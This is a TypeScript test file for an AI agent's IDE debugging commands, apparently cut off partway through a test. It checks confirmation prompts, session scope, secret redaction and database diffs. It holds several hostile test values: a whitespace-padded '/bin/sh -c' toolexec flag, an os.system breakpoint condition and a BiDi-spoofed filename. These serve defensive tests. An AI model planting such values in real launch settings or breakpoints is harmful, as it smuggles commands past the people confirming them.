import { test } from 'node:test';
import assert from 'node:assert/strict';
import { loadSource } from './sourceHarness.ts';
import {
  changedNames, childNamed, confirmSafe, outputTail, pathSegments, shapeDbRead, shapeResponse, shapeResult, newMemory,
  startConfirmText, STOP_MAX_CHARS, userMoved,
} from '../src/lib/uiCommands/ideShape.ts';

// IDE agent debugging (`otto.ui_ide_debug_*`, lib/uiCommands/ide.ts): the
// result shapes (keyed by name so the bridge's redaction masks by key, capped),
// and the handlers against a fake IDE port — confirms, the scope rule,
// `user_moved`, ready signals and the request that outlives a pause.

type Snap = Record<string, any>;

function snap(o: Partial<Snap> = {}): Snap {
  return {
    id: 'dbg1', title: 'TestFlow', language: 'go', adapter: 'dlv', state: 'running', stop_seq: 0,
    threads: [{ id: 1, name: 'main' }], stack_frames: [], scopes: [], inline_values: [], breakpoints: [], output: [],
    ...o,
  };
}

function paused(seq: number, line: number, vars: [string, string, number?][] = [], extra: Partial<Snap> = {}): Snap {
  return snap({
    state: 'paused', stop_seq: seq, stopped_reason: 'breakpoint', paused_file: '/w/app/flow/flow.go', paused_line: line,
    active_thread_id: 1, active_frame_id: 7,
    stack_frames: [{ id: 7, name: 'flow.Create', path: '/w/app/flow/flow.go', line }],
    scopes: [{ name: 'Locals', variables_reference: 1, variables: vars.map(([name, value, ref]) => ({ name, value, variables_reference: ref ?? 0 })) }],
    breakpoints: [{ path: '/w/app/flow/flow.go', line, enabled: true, verified: true }],
    ...extra,
  });
}

// ── shapes ─────────────────────────────────────────────────────────────────

test('shape: a Stop keys locals by name, marks the source line, tracks changes and the new output', () => {
  const mem = { ...newMemory('dbg1', '/w/app'), stopSeq: 1, state: 'paused', expectMove: true, outSeq: 1, locals: { total: '0', items: '[]int len: 3' } };
  const s = paused(2, 21, [['total', '6'], ['items', '[]int len: 3'], ['password', '"hunter2"'], ['req', '*http.Request {…}', 1002]], {
    output: [{ category: 'stdout', text: 'old\n', seq: 1 }, { category: 'stdout', text: 'new line\n', seq: 2 }],
  });
  const { result, mem: next } = shapeResult(s as any, mem, {
    breakpoints: [{ id: 'b1', file: '/w/app/flow/flow.go', line: 21, verified: true }],
    source: ['a', 'b', 'c'], sourceFrom: 20,
  });
  assert.deepEqual(result.locals, { total: '6', items: '[]int len: 3', password: '"hunter2"', req: '*http.Request {…}' });
  assert.deepEqual(result.refs, { req: 1002 });
  assert.deepEqual(result.changed, ['total', 'password', 'req']);
  assert.deepEqual(result.location, { file: 'flow/flow.go', line: 21, function: 'flow.Create' });
  assert.deepEqual(result.source, ['  20 | a', '→ 21 | b', '  22 | c']);
  assert.deepEqual(result.output_tail, ['new line']);
  assert.deepEqual(result.breakpoints, [{ file: 'flow/flow.go', line: 21, verified: true }]);
  assert.deepEqual(result.breakpoints_hit, [{ file: 'flow/flow.go', line: 21 }]);
  assert.equal(result.user_moved, false);
  assert.equal(next.stopSeq, 2);
  assert.equal(next.outSeq, 2);
  assert.equal(next.expectMove, false);
});

test('shape: a huge stop stays under 16 KB; locals cap at 40 with values ≤ 200 chars', () => {
  const vars: [string, string][] = Array.from({ length: 80 }, (_, i) => [`v${i}`, 'x'.repeat(5000)]);
  const out = Array.from({ length: 300 }, (_, i) => ({ category: 'stdout', text: `${'y'.repeat(150)}\n`, seq: i + 1 }));
  const frames = Array.from({ length: 50 }, (_, i) => ({ id: i, name: `f${'z'.repeat(300)}`, path: '/w/app/a.go', line: i + 1 }));
  const { result } = shapeResult(paused(1, 3, vars, { output: out, stack_frames: frames }) as any, newMemory('dbg1', '/w/app'), {
    breakpoints: [], source: Array.from({ length: 13 }, () => 's'.repeat(400)), sourceFrom: 1,
  });
  assert.ok(JSON.stringify(result).length <= STOP_MAX_CHARS, `${JSON.stringify(result).length}`);
  const locals = result.locals as Record<string, string>;
  assert.ok(Object.keys(locals).length <= 40);
  for (const v of Object.values(locals)) assert.ok(v.length <= 200);
  assert.ok((result.frames as unknown[]).length <= 10);
});

test('shape: user_moved only when the person moved it, output tail by seq, changed needs a previous stop', () => {
  const mem = { ...newMemory('dbg1', '/w/app'), stopSeq: 2, state: 'paused', expectMove: false };
  assert.equal(userMoved(paused(2, 5) as any, mem), false);
  assert.equal(userMoved(paused(3, 6) as any, mem), true, 'the person stepped');
  assert.equal(userMoved(snap({ state: 'running', stop_seq: 2 }) as any, mem), true, 'the person continued');
  assert.equal(userMoved(paused(3, 6) as any, { ...mem, expectMove: true }), false, 'the agent moved it');
  assert.deepEqual(outputTail([{ category: 'stdout', text: 'a\nb', seq: 4 }, { category: 'stdout', text: 'c\n', seq: 5 }], 4), { lines: ['c'], seq: 5 });
  // Delve's own console banner is not the program's output.
  assert.deepEqual(outputTail([{ category: 'console', text: "Type 'dlv help' for list of commands.\n", seq: 1 }, { category: 'stdout', text: 'listening on :8080\n', seq: 2 }], 0).lines, ['listening on :8080']);
  assert.deepEqual(changedNames({}, { a: '1' }), []);
});

test('shape: paths, children, responses, the start confirm and DB rows', () => {
  assert.deepEqual(pathSegments('req.Header["X-Id"]'), ['req', 'Header', 'X-Id']);
  assert.deepEqual(pathSegments('items[0].Name'), ['items', '0', 'Name']);
  const kids = [{ name: '[0]', value: '1', variables_reference: 0 }, { name: '"k"', value: '2', variables_reference: 0 }];
  assert.equal(childNamed(kids, '0')?.value, '1');
  assert.equal(childNamed(kids, 'k')?.value, '2');
  const r = shapeResponse({
    status: 201, status_text: 'Created', duration_ms: 75_000, body: 'b'.repeat(20_000), body_base64: '', truncated: false, too_large: false,
    size_bytes: 20_000, content_type: 'text/plain', trace: [],
    headers: [{ key: 'Set-Cookie', value: 'a=1' }, { key: 'set-cookie', value: 'b=2' }, { key: 'Authorization', value: 'Bearer x' }],
  } as any);
  assert.deepEqual(r.headers, { 'set-cookie': 'a=1, b=2', authorization: 'Bearer x' }, 'headers are an object keyed by name');
  assert.equal((r.body as string).length, 16 * 1024);
  assert.equal(r.body_truncated, true);
  const text = startConfirmText({
    label: 'TestFlow', command: 'go test -tags=component -run ^TestFlow$ ./flow', cwd: '/w/app/flow', root: '/w/app',
    build_flags: ['-tags=component'], env: { LOG_LEVEL: 'debug' }, breakpoints: [{ file: 'a', line: 1 }, { file: 'b', line: 2 }, { file: 'c', line: 3 }],
  });
  for (const part of ['go test -tags=component -run ^TestFlow$ ./flow', 'Working directory: flow', 'Build flags: -tags=component', 'LOG_LEVEL="debug"', 'Breakpoints: 3', 'outside the agent’s sandbox']) {
    assert.ok(text.includes(part), `${part} missing from:\n${text}`);
  }
  // C1-002: a value is shown whole and as it is — padding can't push a payload
  // out of view, and control / BiDi / zero-width characters are spelled out.
  const payload = `${' '.repeat(80)}-toolexec=/bin/sh -c evil`;
  const long = 'x'.repeat(300);
  const shown = startConfirmText({
    label: 'TestFlow', command: 'go test ./flow', cwd: '/w/app', root: '/w/app', build_flags: [],
    env: { PAD: payload, LONG: long, BIDI: 'a\u202Egpj.exe', NL: 'a\nb', ZW: 'a\u200Bb' }, breakpoints: [],
  });
  assert.ok(shown.includes(JSON.stringify(payload)), shown);
  assert.ok(shown.includes(long), 'long values are not clipped');
  assert.ok(shown.includes('BIDI="a\\u202Egpj.exe"'), shown);
  assert.ok(shown.includes('NL="a\\nb"'), shown);
  assert.ok(shown.includes('ZW="a\\u200Bb"'), shown);
  const envLines = shown.split('\n').filter((l) => l.startsWith('  '));
  assert.equal(envLines.length, 5, 'one line per variable');
  for (const l of envLines) assert.ok(!/[\u202A-\u202E\u2066-\u2069\u200B-\u200F\uFEFF]/.test(l), l);
  const db = shapeDbRead({
    watch: null as never, compare: 'previous_stop', from_seq: 1, to_seq: 2,
    items: [{
      object: 'orders', engine: 'mysql', executed_query: '', window_full: false, unchanged_count: 1, window_note: 'all 3 rows', columns: ['id', 'secret_key'], added_count: 1, modified_count: 1, removed_count: 0, more_count: 0,
      diffs: [
        { key: '1', kind: 'added', row: [1, '[redacted]'], changes: [] },
        { key: '2', kind: 'modified', row: [2, 'x'], changes: [{ column: 'secret_key', before: '[redacted]', after: '[redacted]', masked: true }] },
      ],
    }],
  }, 5) as any;
  assert.deepEqual(db.objects[0].rows[0], { kind: 'added', key: '1', row: { id: 1, secret_key: '[redacted]' } });
  assert.deepEqual(db.objects[0].rows[1].changes, { secret_key: { before: '[redacted]', after: '[redacted]' } });
});

// ── handlers against a fake IDE port ──────────────────────────────────────

/** Values from the loaded sources live in another realm: compare as JSON. */
const eq = (a: unknown, b: unknown, m = '') => assert.deepEqual(JSON.parse(JSON.stringify(a)), b, m);

class UiCommandError extends Error {
  code: string;
  constructor(code: string, message: string) { super(message); this.code = code; }
}

function fakeIde() {
  const listeners = new Set<(s: Snap) => void>();
  const calls: unknown[][] = [];
  const children: Record<number, unknown[]> = {};
  const ide: any = {
    root: '/w/app', projectRoots: ['/w/app'], debug: null, mine: null as string | null, bps: [] as any[], children, calls,
    agentDebugId: () => ide.mine,
    async openProject(_a: unknown, root: string) { calls.push(['open', root]); },
    async resolveTarget(target: unknown, opts: any) {
      calls.push(['resolve', target, opts]);
      return { root: '/w/app', label: 'TestFlow', language: 'go', command: 'go test -run ^TestFlow$ ./flow', cwd: '/w/app/flow', build_flags: [], env: opts?.env ?? {}, plan: {} };
    },
    async launch(_a: unknown, _p: unknown, opts: unknown) { calls.push(['launch', opts]); ide.mine = 'dbg1'; ide.emit(snap({ state: 'starting' })); return { debug_id: 'dbg1' }; },
    async command(action: string, extra: unknown) { calls.push(['command', action, extra]); return ide.debug; },
    onSnapshot(fn: (s: Snap) => void) { listeners.add(fn); return () => listeners.delete(fn); },
    emit(s: Snap) { ide.debug = s; for (const fn of [...listeners]) fn(s); },
    async setAgentBreakpoints(_a: unknown, bps: any[]) {
      calls.push(['bps', bps]);
      ide.bps = bps.map((b, i) => ({ id: `b${i}`, file: `/w/app/${b.file}`, line: b.line, verified: true }));
      return ide.bps;
    },
    async clearAgentBreakpoints() { const n = ide.bps.length; ide.bps = []; return n; },
    agentBreakpoints: () => ide.bps,
    async variables(ref: number) { return children[ref] ?? []; },
    async evaluate(e: string) { calls.push(['eval', e]); return { result: '42', type: 'int', variables_reference: 0 }; },
    async readLines(_f: string, from: number, to: number) { return Array.from({ length: to - from + 1 }, (_, i) => `line ${from + i}`); },
    consoleNote(t: string) { calls.push(['note', t]); },
    say(_a: unknown, t: string) { calls.push(['say', t]); },
  };
  return ide;
}

function load(detect: unknown = { detected_objects: [], saved_connections: [], ephemeral_targets: [] }) {
  const handlers: Record<string, (args: any, ctx: any) => Promise<any>> = {};
  const uiCommands = {
    UiCommandError,
    whenMounted: async () => null,
    registerUiCommands: (_m: string, map: Record<string, any>) => { Object.assign(handlers, map); return () => {}; },
  };
  const pagePort = loadSource(new URL('../src/lib/uiCommands/pagePort.ts', import.meta.url), { '../uiCommands': uiCommands, '../confirm.svelte': { confirmer: {} } });
  const idePort = loadSource(new URL('../src/lib/uiCommands/idePort.ts', import.meta.url), { './pagePort': pagePort });
  const dbPort = loadSource(new URL('../src/lib/uiCommands/ideDbWatchPort.ts', import.meta.url), { './pagePort': pagePort });
  const shape = loadSource(new URL('../src/lib/uiCommands/ideShape.ts', import.meta.url), {});
  const posts: { path: string; body: any; resolve: (v: unknown) => void; signal?: AbortSignal }[] = [];
  const gets: string[] = [];
  const api = {
    get: async (path: string) => { gets.push(path); return { open: true }; },
    post: async () => detect,
    long: { post: (path: string, body: any, signal?: AbortSignal) => new Promise((resolve, reject) => {
      posts.push({ path, body, resolve, signal });
      signal?.addEventListener('abort', () => reject(new Error('aborted')));
    }) },
  };
  loadSource(new URL('../src/lib/uiCommands/ide.ts', import.meta.url), {
    '../api/client': { api },
    '../stores/uiControl.svelte': { agentName: (a: { provider: string }) => (a.provider === 'claude' ? 'Claude' : a.provider) },
    '../stores/workspace.svelte': { ws: { currentId: 'w1' } },
    '../uiCommands': uiCommands,
    './ideDbWatchPort': dbPort,
    './idePort': idePort,
    './ideShape': shape,
    './pagePort': pagePort,
  });
  const ide = fakeIde();
  idePort.idePort.bind(ide);
  return { handlers, ide, posts, gets, dbPort };
}

function ctx(answer = true) {
  const confirms: any[] = [];
  return {
    confirms,
    id: 'c1',
    agent: { session_id: 's1', title: 'Fix orders', provider: 'claude', cwd: '/w/app', runtime: 'pty' },
    signal: new AbortController().signal,
    progress() {},
    highlight() {},
    async confirmWrite(o: any) { confirms.push(o); return answer; },
  };
}

async function rejectsWith(p: Promise<unknown>, code: string) {
  await assert.rejects(p, (e: any) => e.code === code || assert.fail(`expected ${code}, got ${e.code}: ${e.message}`));
}

const later = (fn: () => void, ms = 20) => setTimeout(fn, ms);

test('start: every start confirms what runs, never remembered; a decline runs nothing', async () => {
  const { handlers, ide } = load();
  // The daemon resolved and confined `root` (ui_commands::confine_paths); the handler still refuses a relative or `..` one.
  await rejectsWith(handlers.ide_debug_start({ root: '/w/app/../x', target: { kind: 'main', file: 'main.go' } }, ctx()), 'invalid_args');
  const no = ctx(false);
  await rejectsWith(handlers.ide_debug_start({ target: { kind: 'test', file: 'flow/flow_test.go', name: 'TestFlow' }, breakpoints: [{ file: 'flow/flow.go', line: 21 }] }, no), 'cancelled_by_user');
  assert.equal(no.confirms.length, 1);
  assert.equal(no.confirms[0].connId, undefined, 'an execute confirm has no scope: never remembered');
  assert.ok(no.confirms[0].what.includes('go test -run ^TestFlow$ ./flow') && no.confirms[0].what.includes('Breakpoints: 1'));
  assert.ok(!ide.calls.some((c: unknown[]) => c[0] === 'launch' || c[0] === 'bps'), 'nothing launched or set after a decline');
});

test('start: returns at the first stop with the breakpoints it bound', async () => {
  const { handlers, ide } = load();
  const c = ctx();
  const run = handlers.ide_debug_start({ target: { kind: 'test', file: 'flow/flow_test.go', name: 'TestFlow' }, breakpoints: [{ file: 'flow/flow.go', line: 21 }], break_on_exceptions: true, wait_ms: 5_000 }, c);
  later(() => ide.emit(paused(1, 21, [['total', '6']])));
  const r = await run;
  assert.equal(r.state, 'paused');
  assert.equal(r.debug_id, 'dbg1');
  eq(ide.calls.find((x: unknown[]) => x[0] === 'launch')?.[1], { break_on_exceptions: true }, 'the flag reaches the IDE launch');
  eq(r.locals, { total: '6' });
  eq(r.breakpoints, [{ file: 'flow/flow.go', line: 21, verified: true }]);
  assert.ok(ide.calls.some((x: unknown[]) => x[0] === 'note' && String(x[1]).includes('(Claude)')), 'the console says who launched it');
});

test('start: ready_pattern and ready_port return as soon as the service is up, not after the wait', async () => {
  const { handlers, ide, gets } = load();
  const t0 = Date.now();
  const run = handlers.ide_debug_start({ target: { kind: 'main', file: 'main.go' }, ready_pattern: 'listening on', wait_ms: 60_000 }, ctx());
  later(() => ide.emit(snap({ state: 'running', output: [{ category: 'stdout', text: 'listening', seq: 1 }, { category: 'stdout', text: ' on :8080\n', seq: 2 }] })));
  const r = await run;
  assert.ok(Date.now() - t0 < 5_000, 'returned at the ready line');
  assert.equal(r.state, 'running');
  assert.equal(r.ready, true);
  eq(r.output_tail, ['listening on :8080']);
  const b = load();
  const run2 = b.handlers.ide_debug_start({ target: { kind: 'main', file: 'main.go' }, ready_port: 8080, wait_ms: 60_000 }, ctx());
  const r2 = await run2;
  assert.equal(r2.ready, true);
  assert.ok(b.gets.some((g) => g === '/ide/debug/sessions/dbg1/port?port=8080'), b.gets.join(','));
  assert.equal(gets.length, 0);
});

test('scope rule: no session of its own → forbidden; the person’s step is reported, not overridden', async () => {
  const { handlers, ide } = load();
  ide.debug = paused(1, 5);
  await rejectsWith(handlers.ide_debug_control({ action: 'continue' }, ctx()), 'forbidden');
  await rejectsWith(handlers.ide_debug_inspect({ paths: ['x'] }, ctx()), 'forbidden');
  const c = ctx();
  const run = handlers.ide_debug_start({ target: { kind: 'main', file: 'main.go' }, wait_ms: 5_000 }, c);
  later(() => ide.emit(paused(1, 5, [['n', '1']])));
  await run;
  ide.emit(paused(2, 6, [['n', '2']])); // the person pressed Step
  const moved = await handlers.ide_debug_control({ action: 'continue' }, c);
  assert.equal(moved.user_moved, true);
  assert.equal(moved.location.line, 6);
  assert.ok(!ide.calls.some((x: unknown[]) => x[0] === 'command'), 'the agent’s continue was not sent');
  // Now in step with the person: a continue runs and waits for the next stop.
  const go = handlers.ide_debug_control({ action: 'continue', wait_ms: 5_000 }, c);
  later(() => ide.emit(paused(3, 9, [['n', '3']])));
  const stop = await go;
  assert.equal(stop.user_moved, false);
  assert.equal(stop.stop_seq, 3);
  eq(stop.changed, ['n']);
  eq(ide.calls.find((x: unknown[]) => x[0] === 'command')?.[1], 'continue');
});

test('end: a run that finished is reported with its exit code, and stop still cleans up the agent’s breakpoints', async () => {
  const { handlers, ide } = load();
  const c = ctx();
  const run = handlers.ide_debug_start({ target: { kind: 'test', file: 'a_test.go', name: 'TestA' }, breakpoints: [{ file: 'a.go', line: 3 }], wait_ms: 5_000 }, c);
  later(() => ide.emit(paused(1, 3)));
  await run;
  const go = handlers.ide_debug_control({ action: 'continue', wait_ms: 5_000 }, c);
  later(() => {
    ide.mine = null; // the IDE lets go of an ended session
    ide.emit(snap({ state: 'terminated', stop_seq: 1, output: [{ category: 'console', text: 'Process exited with code 1\n', seq: 1 }] }));
  });
  const end = await go;
  assert.equal(end.state, 'terminated');
  assert.equal(end.exit_code, 1);
  const stopped = await handlers.ide_debug_control({ action: 'stop' }, c);
  assert.equal(stopped.breakpoints_removed, 1);
  assert.ok(!ide.calls.some((x: unknown[]) => x[0] === 'command' && x[1] === 'stop'), 'nothing left to stop');
});

test('evaluate: every expression confirms, showing it exactly; inspect reads by path, keyed by the path', async () => {
  const { handlers, ide } = load();
  const c = ctx();
  const run = handlers.ide_debug_start({ target: { kind: 'main', file: 'main.go' }, wait_ms: 5_000 }, c);
  later(() => ide.emit(paused(1, 5, [['cfg', 'Config{…}', 11]])));
  await run;
  ide.children[11] = [{ name: '*cfg', value: 'Config{…}', variables_reference: 12 }];
  ide.children[12] = [{ name: 'Password', value: '"hunter2"', variables_reference: 0 }, { name: 'Host', value: '"db"', variables_reference: 0 }];
  const got = await handlers.ide_debug_inspect({ paths: ['cfg.Password', 'cfg.Host', 'cfg.Nope'] }, c);
  eq(got.values['cfg.Password'], { value: '"hunter2"' }, 'keyed by the path, so redaction masks it by name');
  assert.equal(got.values['cfg.Host'].value, '"db"');
  assert.ok(got.values['cfg.Nope'].error.includes('Password'), 'a miss names what exists');
  assert.equal(c.confirms.length, 1, 'inspect asked nothing');
  const r = await handlers.ide_debug_evaluate({ expression: 'cfg.Port + 1' }, c);
  assert.equal(c.confirms.length, 2);
  assert.ok(c.confirms[1].what.includes('cfg.Port + 1'));
  assert.equal(c.confirms[1].connId, undefined);
  eq(r.values, { 'cfg.Port + 1': { value: '42', type: 'int' } }, 'keyed by the expression, so redaction masks it by name');
  const no = { ...c, confirmWrite: async () => false };
  await rejectsWith(handlers.ide_debug_evaluate({ expression: 'os.Exit(1)' }, no), 'cancelled_by_user');
  assert.equal(ide.calls.filter((x: unknown[]) => x[0] === 'eval').length, 1);
});

test('request: returns at the stop it hit; the response that lands during the pause comes with the next result', async () => {
  const { handlers, ide, posts } = load();
  const c = ctx();
  const run = handlers.ide_debug_start({ target: { kind: 'main', file: 'main.go' }, ready_pattern: 'listening', wait_ms: 5_000 }, c);
  later(() => ide.emit(snap({ state: 'running', output: [{ category: 'stdout', text: 'listening\n', seq: 1 }] })));
  await run;
  const req = handlers.ide_debug_request({ method: 'POST', url: 'http://localhost:8080/orders', headers: { 'Content-Type': 'application/json' }, body: '{}', wait_ms: 5_000 }, c);
  later(() => ide.emit(paused(1, 12, [['path', '"/orders"']])));
  const r = await req;
  assert.equal(c.confirms.at(-1).connId, 'ide-debug-request:localhost:8080', 'remembered per host and port, apart from the API client');
  assert.equal(posts.length, 1);
  assert.equal(posts[0].path, '/workspaces/w1/api-client/execute');
  assert.equal(posts[0].body.debug_session_id, 'dbg1', 'the live debug session the daemon checks');
  assert.equal(posts[0].body.timeout_ms, 600_000, 'outlives a pause');
  assert.equal(posts[0].body.follow_redirects, false);
  eq(r.request, { in_flight: true });
  assert.equal(r.stop.location.line, 12);
  assert.ok(ide.calls.some((x: unknown[]) => x[0] === 'note' && String(x[1]).startsWith('→ POST localhost:8080/orders')));
  // The person waits 75 s, then Continue: the response lands while no call runs.
  posts[0].resolve({ status: 201, status_text: 'Created', duration_ms: 75_000, headers: [], body: 'ok', truncated: false, too_large: false });
  await new Promise((res) => setTimeout(res, 10));
  ide.emit(snap({ state: 'running', stop_seq: 1 }));
  const next = await handlers.ide_debug_control({ action: 'wait', wait_ms: 30 }, c);
  assert.equal(next.request.status, 201);
  assert.equal(next.request.in_flight, false);
  const after = await handlers.ide_debug_control({ action: 'status' }, c);
  assert.equal(after.request, undefined, 'delivered once');
});

test('request: a response before any stop is returned at once', async () => {
  const { handlers, ide, posts } = load();
  const c = ctx();
  const run = handlers.ide_debug_start({ target: { kind: 'main', file: 'main.go' }, ready_pattern: 'up', wait_ms: 5_000 }, c);
  later(() => ide.emit(snap({ state: 'running', output: [{ category: 'stdout', text: 'up\n', seq: 1 }] })));
  await run;
  const req = handlers.ide_debug_request({ url: 'http://127.0.0.1:8080/health', wait_ms: 5_000 }, c);
  later(() => posts[0].resolve({ status: 200, status_text: 'OK', duration_ms: 3, headers: [{ key: 'X-Token', value: 't' }], body: 'fine', truncated: false, too_large: false }));
  const r = await req;
  assert.equal(r.request.status, 200);
  eq(r.request.headers, { 'x-token': 't' });
  assert.equal(r.state, 'running');
  assert.equal(r.stop, undefined);
});

test('db watch: the agent start names the agent; a declined prod confirm and a failed start come back as errors, never “watching”', async () => {
  const { handlers, ide, dbPort } = load({
    detected_objects: [{ engine: 'mysql', object_name: 'orders' }],
    saved_connections: [{ connection_id: 'p', name: 'pr_bo prod', engine: 'mysql', local: false }],
    ephemeral_targets: [],
  });
  const c = ctx();
  const run = handlers.ide_debug_start({ target: { kind: 'main', file: 'main.go' }, wait_ms: 5_000 }, c);
  later(() => ide.emit(paused(1, 5)));
  await run;
  const asked: unknown[] = [];
  let answer: unknown = null;
  let error: string | null = null;
  dbPort.ideDbWatchPort.bind({
    watch: null,
    get error() { return error; },
    async start(_req: unknown, opts: unknown) { asked.push(opts); return answer; },
    async stop() {},
    async diffSince() { return null; },
  });
  await rejectsWith(handlers.ide_debug_db({ action: 'watch', connection_id: 'p' }, c), 'cancelled_by_user');
  eq(asked[0], { asker: 'Claude' });
  error = 'connection refused';
  await rejectsWith(handlers.ide_debug_db({ action: 'watch', connection_id: 'p' }, c), 'failed');
  answer = { id: 'w', target: { label: 'pr_bo prod', local: false, engine: 'mysql' }, bind: { debug_session_id: 'dbg1' }, busy: false };
  error = null;
  const ok = await handlers.ide_debug_db({ action: 'watch', connection_id: 'p' }, c);
  assert.equal(ok.watching, true);
});

test('say: a move without one clears the last stop’s narration; a status without one keeps it', async () => {
  const { handlers, ide } = load();
  const c = ctx();
  const run = handlers.ide_debug_start({ target: { kind: 'main', file: 'main.go' }, wait_ms: 5_000 }, c);
  later(() => ide.emit(paused(1, 5)));
  await run;
  const says = () => ide.calls.filter((x: unknown[]) => x[0] === 'say').map((x: unknown[]) => x[1]);
  await handlers.ide_debug_control({ action: 'status', say: 'Paused before the write' }, c);
  await handlers.ide_debug_control({ action: 'status' }, c);
  eq(says(), ['Paused before the write']);
  const go = handlers.ide_debug_control({ action: 'step_over', wait_ms: 5_000 }, c);
  later(() => ide.emit(paused(2, 6)));
  await go;
  eq(says(), ['Paused before the write', '']);
  await handlers.ide_debug_control({ action: 'status', say: 'The row is written' }, c);
  const req = handlers.ide_debug_request({ url: 'http://localhost:8080/orders', wait_ms: 5_000 }, c);
  later(() => ide.emit(paused(3, 5)));
  await req;
  eq(says(), ['Paused before the write', '', 'The row is written', ''], 'a request moves the program too');
});

test('db_watch on start: the container the launch names (its DSN port) for the code’s engine is watched, not just the newest one', async () => {
  const { handlers, ide, dbPort } = load({
    detected_objects: [{ engine: 'mysql', object_name: 'orders' }],
    saved_connections: [],
    ephemeral_targets: [
      { ephemeral_id: 'tc:new:1111', engine: 'mysql', port: 1111, source: 'testcontainers' },
      { ephemeral_id: 'tc:redis:3333', engine: 'redis', port: 3333, source: 'container' },
      { ephemeral_id: 'tc:mine:2222', engine: 'mysql', port: 2222, source: 'container' },
    ],
  });
  const asked: any[] = [];
  dbPort.ideDbWatchPort.bind({
    watch: null,
    error: null,
    async start(req: unknown) { asked.push(req); return { id: 'w', target: { label: 'mine', local: true, engine: 'mysql' }, bind: null, busy: false }; },
    async stop() {},
    async diffSince() { return null; },
  });
  const run = handlers.ide_debug_start({ target: { kind: 'main', file: 'main.go' }, env: { ORDERS_DSN: 'root:pw@tcp(127.0.0.1:2222)/shop', ORDERS_REDIS: '127.0.0.1:3333' }, db_watch: true, wait_ms: 5_000 }, ctx());
  later(() => ide.emit(paused(1, 5)));
  const r = await run;
  assert.equal(r.db.watching, true);
  eq(asked[0].target, { kind: 'ephemeral', ephemeral_id: 'tc:mine:2222' });
});

test('db watch without a launch hint: the engine the code uses, even when a newer container of another engine runs', async () => {
  const { handlers, ide, dbPort } = load({
    detected_objects: [{ engine: 'mysql', object_name: 'orders' }],
    saved_connections: [],
    ephemeral_targets: [
      { ephemeral_id: 'c:redis:3333', engine: 'redis', port: 3333, source: 'container' },
      { ephemeral_id: 'c:maria:2222', engine: 'mysql', port: 2222, source: 'container' },
    ],
  });
  const c = ctx();
  const run = handlers.ide_debug_start({ target: { kind: 'main', file: 'main.go' }, wait_ms: 5_000 }, c);
  later(() => ide.emit(paused(1, 5)));
  await run;
  const asked: any[] = [];
  dbPort.ideDbWatchPort.bind({
    watch: null,
    error: null,
    async start(req: unknown) { asked.push(req); return { id: 'w', target: { label: 'maria', local: true, engine: 'mysql' }, bind: null, busy: false }; },
    async stop() {},
    async diffSince() { return null; },
  });
  const out = await handlers.ide_debug_db({ action: 'watch' }, c);
  assert.equal(out.watching, true);
  eq(asked[0].target, { kind: 'auto', engine: 'mysql' });
  eq(asked[0].items, [{ object: 'orders' }]);
});

test('db: without the IDE’s DB Watch bound it says so; with it, a stop carries the masked diff of the bound watch', async () => {
  const { handlers, ide, dbPort } = load();
  const c = ctx();
  const run = handlers.ide_debug_start({ target: { kind: 'main', file: 'main.go' }, wait_ms: 5_000 }, c);
  later(() => ide.emit(paused(1, 5)));
  await run;
  await rejectsWith(handlers.ide_debug_db({ action: 'diff' }, { ...c, signal: AbortSignal.timeout(10_000) }), 'failed');
  const asked: unknown[] = [];
  dbPort.ideDbWatchPort.bind({
    watch: { id: 'w', target: { label: 'mysql', local: true, engine: 'mysql' }, bind: { debug_session_id: 'dbg1' }, busy: false },
    async start() {},
    async stop() {},
    async diffSince(compare: string, opts: unknown) {
      asked.push([compare, opts]);
      return { from_seq: 0, to_seq: 1, items: [{ object: 'orders', window_note: 'all', columns: ['id'], added_count: 1, modified_count: 0, removed_count: 0, more_count: 0, diffs: [{ key: '1', kind: 'added', row: [1], changes: [] }] }] };
    },
  });
  const go = handlers.ide_debug_control({ action: 'continue', wait_ms: 5_000 }, c);
  later(() => ide.emit(paused(2, 9)));
  const stop = await go;
  assert.equal(stop.db.objects[0].added, 1);
  eq(asked[0], ['previous_stop', { forAgent: true }], 'the agent always reads masked rows');
});

test('C1-001: breakpoint code is shown verbatim — in the start confirm, and as its own confirm when set later', async () => {
  const { handlers, ide } = load();
  const c = ctx();
  const run = handlers.ide_debug_start({
    target: { kind: 'main', file: 'main.go' }, wait_ms: 5_000,
    breakpoints: [{ file: 'a.go', line: 3, condition: "__import__('os').system('x')" }, { file: 'b.go', line: 4, log_message: '{password}' }, { file: 'c.go', line: 5 }],
  }, c);
  later(() => ide.emit(paused(1, 3)));
  await run;
  const what = c.confirms[0].what as string;
  assert.ok(what.includes("a.go:3 — condition __import__('os').system('x')"), what);
  assert.ok(what.includes('b.go:4 — logs {password}'), what);
  assert.ok(!what.includes('c.go'), 'a plain breakpoint is just counted');
  // Later: a plain breakpoint asks nothing, one with code asks every time; a decline sets nothing.
  await handlers.ide_debug_breakpoints({ set: [{ file: 'd.go', line: 1 }] }, c);
  assert.equal(c.confirms.length, 1);
  const no = { ...c, confirmWrite: async (o: any) => (c.confirms.push(o), false) };
  const before = ide.calls.filter((x: unknown[]) => x[0] === 'bps').length;
  await rejectsWith(handlers.ide_debug_breakpoints({ set: [{ file: 'e.go', line: 2, hit_condition: '> 3' }] }, no), 'cancelled_by_user');
  assert.ok(c.confirms.at(-1).what.includes('e.go:2 — hit count > 3'));
  assert.equal(c.confirms.at(-1).connId, undefined, 'never remembered');
  assert.equal(ide.calls.filter((x: unknown[]) => x[0] === 'bps').length, before, 'nothing set after a decline');
});

test('C1-020: inspect expands only a ref the agent was shown, never one under a secret name', async () => {
  const { handlers, ide } = load();
  const c = ctx();
  const run = handlers.ide_debug_start({ target: { kind: 'main', file: 'main.go' }, wait_ms: 5_000 }, c);
  later(() => ide.emit(paused(1, 5, [['cfg', 'Config{…}', 11], ['secrets', '[]string len: 2', 12]])));
  const stop = await run;
  eq(stop.refs, { cfg: 11, secrets: 12 });
  ide.children[11] = [{ name: 'DB', value: 'DB{…}', variables_reference: 21 }];
  ide.children[12] = [{ name: '[0]', value: '"s3cret"', variables_reference: 0 }];
  ide.children[21] = [{ name: 'Host', value: '"db"', variables_reference: 0 }];
  await rejectsWith(handlers.ide_debug_inspect({ ref: 12 }, c), 'forbidden');
  await rejectsWith(handlers.ide_debug_inspect({ ref: 13 }, c), 'forbidden');
  const cfg = await handlers.ide_debug_inspect({ ref: 11 }, c);
  eq(cfg.children.DB, { value: 'DB{…}', ref: 21 });
  const db = await handlers.ide_debug_inspect({ ref: 21 }, c); // a ref inspect just showed
  assert.equal(db.children.Host.value, '"db"');
  // The next stop starts a new list.
